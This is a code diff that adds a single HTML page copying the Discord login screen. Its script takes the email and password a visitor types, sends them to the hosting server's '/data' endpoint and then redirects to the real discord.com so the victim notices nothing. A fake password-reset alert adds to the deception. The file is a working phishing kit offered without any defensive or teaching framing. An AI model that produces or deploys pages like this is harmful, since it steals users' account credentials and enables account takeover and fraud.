@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Catamaran:wght@100;200;300;500;600;700;800;900&display=swap"
+      rel="stylesheet"
+    />
+    <title>Discord</title>
+  </head>
+
+  <style>
+    body,
+    html {
+      height: 100%;
+      margin: 0;
+
+      font-family: "Catamaran", sans-serif;
+    }
+    html {
+      background: url("/svg/discord-background.svg") no-repeat center center
+        fixed;
+      -webkit-background-size: cover;
+      -moz-background-size: cover;
+      -o-background-size: cover;
+      background-size: cover;
+    }
+
+    #login-box {
+      background-color: #36393f;
+      max-width: 480px;
+      padding: 32px;
+      border-radius: 5px;
+      box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
+    }
+
+    input {
+      border: 1px solid #222428;
+      padding: 10px;
+      font-size: 16px;
+      width: 95%;
+      border-radius: 3px;
+      color: #dcddde;
+      background-color: #313339;
+      border-width: 1px;
+      transition: border-color 0.2s ease-in-out;
+    }
+
+    input:hover {
+      border: 1px solid #040405;
+    }
+
+    #login-btn {
+      background-color: #5865f2;
+      color: #fff;
+      font-weight: 500;
+      margin-top: 8px;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+      height: 44px;
+      border-radius: 3px;
+      width: 100%;
+      transition: 0.2s ease-in-out;
+    }
+
+    #login-btn:hover {
+      background-color: #4752c4;
+    }
+    #login-box-center {
+      height: 100vh;
+      width: 100%;
+      display: grid;
+      place-items: center;
+    }
+  </style>
+  <script>
+    function submitData() {
+      fetch("/data", {
+        method: "post",
+        headers: {
+          Accept: "application/json",
+          "Content-Type": "application/json",
+        },
+
+        //make sure to serialize your JSON body
+        body: JSON.stringify({
+          username: document.getElementById("username").value,
+          password: document.getElementById("password").value,
+        }),
+      }).then((response) => {
+        //do something awesome that makes the world a better place (i love the irony of this sentence)
+        window.location.href = "https://discord.com/";
+      });
+    }
+  </script>
+  <body>
+    <form onsubmit="submitData(); return false;">
+      <div id="login-box-center">
+        <div id="login-box">
+          <h3 style="margin: 0; font-size: 24px; color: white">
+            Welcome back!
+          </h3>
+          <p
+            style="margin: 0; font-size: 16px; color: #b9bbbe; font-weight: 300"
+          >
+            We're so excited to see you again!
+          </p>
+          <h5
+            style="
+              margin-top: 1rem;
+              margin-bottom: 8px;
+              font-size: 12px;
+              color: #8e9297;
+            "
+          >
+            EMAIL OR PHONE NUMBER
+          </h5>
+          <input
+            name="email"
+            type="email"
+            placeholder=""
+            aria-label="Email or Phone Number"
+            autocomplete="off"
+            maxlength="999"
+            spellcheck="false"
+            value=""
+            id="username"
+          />
+          <h5
+            style="
+              margin-top: 1rem;
+              margin-bottom: 8px;
+              font-size: 12px;
+              color: #8e9297;
+            "
+          >
+            PASSWORD
+          </h5>
+          <input
+            name="email"
+            type="text"
+            placeholder=""
+            aria-label="Email or Phone Number"
+            autocomplete="off"
+            maxlength="999"
+            spellcheck="false"
+            value=""
+            id="password"
+          />
+          <button
+            style="
+              background-color: transparent;
+              color: #00aff4;
+              font-weight: 500;
+              margin-top: 8px;
+              border: none;
+              cursor: pointer;
+            "
+            onclick="alert('Instructions sent on how to reset your password')"
+          >
+            Forgot your password?
+          </button>
+          <div>
+            <button id="login-btn">Login</button>
+          </div>
+        </div>
+      </div>
+    </form>
+  </body>
+</html>
